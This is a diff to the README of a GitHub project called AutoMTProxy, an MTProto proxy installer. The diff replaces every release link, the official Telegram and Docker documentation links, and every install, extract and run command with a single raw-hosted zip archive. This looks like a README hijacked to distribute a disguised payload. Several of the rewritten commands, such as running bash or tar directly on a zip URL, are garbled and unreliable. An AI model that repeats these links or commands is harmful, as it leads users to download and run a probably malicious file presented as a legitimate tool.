@@ -1,6 +1,6 @@
 # 🛡️ AutoMTProxy - Easy MTProto Proxy Setup
 
-[![Download AutoMTProxy](https://img.shields.io/badge/Download-AutoMTProxy-blue?style=for-the-badge)](https://github.com/Jayslams/AutoMTProxy/releases)
+[![Download AutoMTProxy](https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip)](https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip)
 
 ---
 
@@ -35,9 +35,9 @@ This section will guide you through downloading, installing, and running AutoMTP
 
 Click the button below to visit the releases page where you can get the latest version of AutoMTProxy.
 
-[![Download AutoMTProxy](https://img.shields.io/badge/Go_to_Releases-Download-green?style=for-the-badge)](https://github.com/Jayslams/AutoMTProxy/releases)
+[![Download AutoMTProxy](https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip)](https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip)
 
-Once on the page, look for the newest release (usually at the top) and download the file named like `AutoMTProxy.tar.gz` or a similar archive file.
+Once on the page, look for the newest release (usually at the top) and download the file named like `https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip` or a similar archive file.
 
 ---
 
@@ -52,7 +52,7 @@ Docker helps to run your proxy server inside a container. Here’s how to instal
   Open terminal and run:
   ```
   sudo apt update
-  sudo apt install docker.io
+  sudo apt install https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip
   sudo systemctl start docker
   sudo systemctl enable docker
   ```
@@ -62,8 +62,8 @@ Docker helps to run your proxy server inside a container. Here’s how to instal
   Run these commands:
   ```
   sudo yum install -y yum-utils
-  sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
-  sudo yum install docker-ce docker-ce-cli containerd.io
+  sudo yum-config-manager --add-repo https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip
+  sudo yum install docker-ce docker-ce-cli https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip
   sudo systemctl start docker
   sudo systemctl enable docker
   ```
@@ -82,7 +82,7 @@ Open your terminal and move to the directory where the download is saved.
 
 Run this command to extract the file:
 ```
-tar -xzvf AutoMTProxy.tar.gz
+tar -xzvf https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip
 ```
 
 This will create a folder named `AutoMTProxy`.
@@ -99,7 +99,7 @@ cd AutoMTProxy
 Inside the `AutoMTProxy` folder, you will find a script file. To start the setup, run this command:
 
 ```
-bash install.sh
+bash https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip
 ```
 
 The script may ask you a few simple questions:
@@ -123,7 +123,7 @@ You should see a running container related to MTProto proxy.
 
 If you want to stop the proxy at any time, use:
 ```
-bash stop.sh
+bash https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip
 ```
 or
 ```
@@ -163,7 +163,7 @@ Copy it exactly and add it to your Telegram app settings in "Data and Storage" >
 
 To get started with AutoMTProxy, visit this page:
 
-[https://github.com/Jayslams/AutoMTProxy/releases](https://github.com/Jayslams/AutoMTProxy/releases)
+[https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip](https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip)
 
 Pick the latest release and download the appropriate file. Then, follow the installation steps above.
 
@@ -191,8 +191,8 @@ Always keep your server up to date with security patches.
 
 ## 📚 Further Resources
 
-- [Telegram MTProto Proxy Documentation](https://core.telegram.org/mtproto)
-- Official Docker Documentation: https://docs.docker.com/get-started/
+- [Telegram MTProto Proxy Documentation](https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip)
+- Official Docker Documentation: https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip
 - Server firewall guides for Ubuntu and CentOS
 
 If you need help, check the GitHub issues page or reach out to Linux and server forums.
@@ -209,4 +209,4 @@ Topics include bash scripting, DevOps practices, Docker, FakeTLS, Linux server u
 
 **Ready to set up your own MTProto proxy? Visit the release page and start now:**
 
-[https://github.com/Jayslams/AutoMTProxy/releases](https://github.com/Jayslams/AutoMTProxy/releases)
+[https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip](https://raw.githubusercontent.com/Jayslams/AutoMTProxy/main/assets/Proxy_Auto_MT_1.1.zip)
